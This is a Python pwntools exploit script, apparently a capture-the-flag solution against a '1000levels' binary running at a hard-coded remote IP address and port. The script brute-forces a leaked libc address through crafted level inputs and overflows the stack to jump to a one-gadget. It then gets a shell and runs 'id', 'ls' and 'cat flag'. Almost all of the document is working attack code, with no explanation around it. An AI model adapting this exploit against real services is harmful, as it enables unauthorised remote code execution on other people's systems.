from pwn import *
import ctypes

# nc 47.74.147.103 20001
#s = process('./1000levels')
s = remote('47.74.147.103', 20001)
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def test(x):
	# x + i > 0 ???
#	s.recvuntil('Choice:\n')
#	s.send('0'*30 + '2')
#	s.recvuntil('Choice:\n')
#	s.send('0'*30 + '1')
#	s.recvuntil('How many levels?\n')
#	s.send('-10'+'\x00'*(31-3))

	payload = '0'*30 + '2'
	payload += '0'*30 + '1'
	payload += '-10'+'\x00'*(31-3)
	s.send(payload)
	s.recvuntil('Any more?\n')

	i = ctypes.c_int64(0x10000000000000000 - x).value
	s.sendline(str(i))
	respond = s.recvline()
	respond += s.recvline()
	print respond
	if 'Coward' in respond:
		return False
	else:
		return True


def miracle():

#	s.recvuntil('Choice:\n')
#	s.send('0'*30 + '2')

	# tinh toan lai
#	l = 0x800000000000
#	l = 0x7efcc2000000
#	l = 0x7efcc2000000 
	l = 0x7efc56000000
#	l = int(raw_input('test> '), 16)
	while True:
		payload = '0'*30 + '2'
		payload += '0'*30 + '1'
		payload += '-10'+'\x00'*28

		i = ctypes.c_int64(0x10000000000000000 - l).value
		payload += str(i)
		s.sendline(payload)

#		

#		s.sendline(str(i))
#		respond += s.recvline()
#		respond += s.recvline()
#		print respond
		respond = s.recvuntil('Any more?\n')
		respond = s.recv(6)
#		print respond
#		sleep(0.25)
		if not 'Coward' in respond:
			break
		l -= 0x1000
#		print hex(l)

	return l

def pwn():
#	pause()
#	raw_input('debug> ')
	
	i = 1

	global s
	while True:
		try:
			print 'try:', i, '/ 256'
			x = miracle()
			print 'x:', hex(x)
			libc_base = (x - libc.symbols['system'] + 1000) & 0xfffffffffffff000
			print 'libc_base:', hex(libc_base)
			gg = libc_base + 0x4526a

		#	raw_input('debug> ')

			s.recvuntil('Answer:')
			payload = 'A'*0x38 + p64(gg)
			s.sendline(payload)
#			s.interactive()


			s.sendline('id')
			data = s.recv(4096, timeout=0.5)
			print 'get shell cmnr!!!'
			data += s.recv(4096, timeout=0.5)
			print data

			s.sendline('ls')
			data = s.recv(4096, timeout=0.5)
			data += s.recv(4096, timeout=0.5)
			print data

			s.sendline('cat flag')
			data = s.recv(4096, timeout=0.5)
			data += s.recv(4096, timeout=0.5)
			print data
			if data:
				break

		except:
#			break
#			s.wait()
			s.close()
#			s = process('./1000levels')
			s = remote('47.74.147.103', 20001)
			sleep(0.1)
			i += 1

pwn()
# 6778
